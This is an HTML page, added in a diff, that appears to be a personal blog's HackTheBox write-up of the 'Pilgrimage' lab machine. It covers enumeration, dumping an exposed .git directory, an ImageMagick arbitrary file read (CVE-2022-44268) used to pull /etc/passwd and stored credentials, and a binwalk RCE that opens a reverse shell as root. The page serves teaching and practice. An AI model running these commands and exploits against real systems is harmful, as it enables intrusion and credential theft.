@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        margin-top: 10px;
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3, a {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Pilgrimage</h1>
+        <img class="box-icon" src="/hack/images/pilgrimage.png"></img>
+        <p><i>Full compromise on June 29, 2023</br>Written on March 29, 2024</i></p>
+        <p>Pilgrimage is my 11th machine to compromise on HackTheBox. This Linux machine mainly features vulnerable software. ImageMagick with a arbitrary file read 
+            vulnerability, and binwalk with a RCE vulnerability.
+        </p>
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan, first scanning for any open ports, then scanning those open ports for more information.</p>
+        <pre><code>nmap 10.10.11.219 -p- --min-rate=3000</br>nmap 10.10.11.219 -p22,80 -sC -sV --min-rate=3000</code></pre>
+        <img src="../images/pilgrimage2.png">
+        <p>The Nmap scans show a redirect to http://pilgrimage.htb on port 80. We'll add this to our hosts file and link it to 10.10.11.219.</p>
+        <pre><code>echo "10.10.11.219" pilgrimage.htb | sudo tee -a /etc/hosts</br>cat /etc/hosts</code></pre>
+        <img src="../images/pilgrimage3.png">
+        
+        <h3>TCP Port 80 - HTTP</h3>
+        <p>Navigating to http://pilgrimage.htb, we are presented with this website:</p>
+        <img src="../images/pilgrimage4.png">
+        <p>We're able to login, register, and upload an image. It seems like the main functionality of this web application
+            is to shrink uploaded images. If we create an account and upload an image, the shrunken image will be saved to our dashboard.</p>
+        <img src="../images/pilgrimage5.png">
+        <p>Poking around, it seems like navigating to http://pilgrimage.htb/shrunk/../../../../../../../etc/passwd in hopes for a local file inclusion
+            vulnerability, it doesn't work.</p>
+        <img src="../images/pilgrimage6.png">
+        <p>We'll enumerate more. We'll fuzz for directories in case there's a hidden one.</p>
+        <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://pilgrimage.htb/FUZZ</code></pre>
+        <img src="../images/pilgrimage7.png">
+        <p>Ffuf revealed a notable directory called .git. The .git directory potentially holds previous changes to the website which may
+            hold juicy information.</p>
+        <p>If we try to navigate directly to http://pilgrimage.htb/.git, we get a 403 forbidden error.</p>
+        <img src="../images/pilgrimage8.png">
+        <p>But if we try to navigate to http://pilgrimage.htb/.git/config, it downloads the .git/config file.</p>
+        <img src="../images/pilgrimage9.png">
+        <p>We'll find a tool that can export the .git directory. A quick Google search will reveal what we need. We can use a tool called git-dumper.</p>
+        <img src="../images/pilgrimage10.png">
+        <p>From the git repository arthud/git-dumper:</p>
+        <img src="../images/pilgrimage11.png">
+        <p>After installing the tool, we'll now extract the .git repository.</p>
+        <pre><code>python3 ./git_dumper.py http://pilgrimage.htb/.git ~/pilgrimage</code></pre>
+        <img src="../images/pilgrimage12.png">
+        <p>Not only the tool extracted the .git repository, it also rebuilt/extracted the source .php files from the .git directory.</p>
+        <img src="../images/pilgrimage13.png">
+        <p>The magick binary is interesting and unusual to be in web root. If we run the magick binary, we can get the version number.</p>
+        <p><i>(I mainly use an Apple Silicon MacBook with a Kali Linux VM. I had to transfer the magick binary to an Intel (x86) machine to be able to run it.)</i></p>
+        <pre><code>chmod +x ./magick</br>./magick -version</code></pre>
+        <img src="../images/pilgrimage14.png">
+
+        <h2>Exploit - Arbitrary File Read</h2>
+        <p>Searching Google for an exploit for that version, we can find an arbitrary file read proof-of-concept (PoC).</p>
+        <img src="../images/pilgrimage15.png">
+        <p>The Exploit-DB article leads to this GitHub repository:</p>
+        <img src="../images/pilgrimage16.png">
+        <p>The GitHub repository contains the original POC of the ImageMagick vulnerability. According to the original article of the vulnerability from metabaseq,
+            if there is an added textual chunk type to the image with the keyword "profile", then ImageMagick will interpret that string as a filename and will load the content. </p>
+        <p>This PoC will essentially do that. It will add a textual chunk type with the keyword "profile" to an image and add a filename to it. Let's use the exploit.</p>
+        <p>We'll follow the instructions on the git repository to generate our modified image. We'll first try to read /etc/passwd from the target machine.</p>
+        <pre><code>git clone https://github.com/voidz0r/CVE-2022-44268</br>cd CVE-2022-44268</br>cargo run "/etc/passwd"</code></pre>
+        <img src="../images/pilgrimage17.png">
+        <p>Now that our image is generated, let's upload it to the target.</p>
+        <img src="../images/pilgrimage18.png">
+        <p>We'll follow the link and download our shrunken image. If we look into the metadata of the shrunken image, we can see a bunch of hex code. </p>
+        <pre><code>identify -verbose 660b6d5331b4e.png</code></pre>
+        <img src="../images/pilgrimage19.png">
+        <p>Throwing this hex code into Cyberchef to convert it to string, we get the contents of the /etc/passwd file. This confirms that we have file read on the target machine.</p>
+        <img src="../images/pilgrimage20.png">
+        <p>From the source files we got from extracting the .git directory, the file dashboard.php contains the file path for the SQL database.</p>
+        <img src="../images/pilgrimage21.png">
+        <p>Knowing the database file path, we can extract the database using the file read exploit and hopefully reveal sensitive information. Let's generate a new image with the database file path.</p>
+        <pre><code>cd ~/CVE-2022-44268</br>cargo run "/var/db/pilgrimage"</code></pre>
+        <img src="../images/pilgrimage22.png">
+        <p>Now we'll upload our image, download the shrunken version of our image, inspect the metadata, and throw the hex code to Cyberchef.</p>
+        <img src="../images/pilgrimage23.png">
+        <p>From the output, we can see the username and password of the account I created <i>(Username: hack, Password: 1)</i>. We can also see another set of credentials with the username of emily and password abigchonkyboi123.
+            Let's try to SSH into the target machine with these set of credentials.</p>
+        <pre><code>ssh emily@10.10.11.219</br>abigchonkyboi123</code></pre>
+        <img src="../images/pilgrimage24.png">
+        <p>It works. We're in the target machine. Let's get user flag.</p>
+        <pre><code>cat ~/user.txt</code></pre>
+        <img src="../images/pilgrimage25.png">
+        
+        <h2>Privilege Escalation - Binwalk RCE</h2>
+        <p>Inspecting running processes, there's an process running an unusual script called "malwarescan.sh" by root.</p>
+        <pre><code>ps aux</code></pre>
+        <img src="../images/pilgrimage26.png">
+        <p>Reading the script, it's main function is to use a binary called "binwalk" to analyze uploaded images at /var/www/pilgrimage.htb/shrunk. If the image is actually an executable script, it will delete the image.</p>
+        <img src="../images/pilgrimage27.png">
+        <p>Running the binary with no arguments, we can find the binary version number.</p>
+        <pre><code>/usr/local/bin/binwalk</code></pre>
+        <img src="../images/pilgrimage28.png">
+        <p>We can find a public exploit on the internet that matches the binary version number.</p>
+        <img src="../images/pilgrimage29.png">
+        <p>This <a href="https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/">article</a> by OneKey explains the vulnerability. The vulnerability in binwalk lies within the usage of "os.path.join" in its Python source code. In version 2.3.2, there was a change in attempt to prevent path traversal when
+            merging a PFS Extractor plugin. In the change, os.path.join is used to form the path of the desired file to be extracted. Then, a condition checks if the formed path isn't going outside the extraction directory.
+            The problem is that os.path.join doesn't completely resolve the path if it contained "../". This means that the condition is never met and binwalk will write files anywhere
+            in the filesystem.</p>
+        <p>This can be used to write a binwalk plugin to the plugin directory. Binwalk plugins are activated when they're dropped into the plugin directory, and the plugin can be made to execute a shell command,
+            thus granting remote command execution.</p>
+        <p>The public exploit will create a malicious PFS file which will tell binwalk to load a malicious plugin which will send a reverse shell to a listener. Let's use it.</p>
+        <p>First we'll set up our listener on our attack machine.</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <img src="../images/pilgrimage30.png">
+        <p>Then we'll copy paste the exploit to the target machine and run the it, giving it a template .png file (so the malicious .png file has an actual image) and our listener IP and port.
+            Then I'll move the malicious .png file to the /var/www/pilgrimage.htb/shrunk directory so binwalk can analyze it and trigger our payload.</p>
+        <pre><code>nano poc.py</br>python3 poc.py /var/www/pilgrimage.htb/shrunk/660bad2bc211e.png 10.10.14.4 4444</br>mv binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/binwalk_exploit.png</code></pre>
+        <img src="../images/pilgrimage31.png">
+        <p>On our listener, we get a reverse shell as root and obtained the root flag.</p>
+        <pre><code>whoami</br>cat /root/root.txt</code></pre>
+        <img src="../images/pilgrimage32.png">
+
+    </div>
+</html>
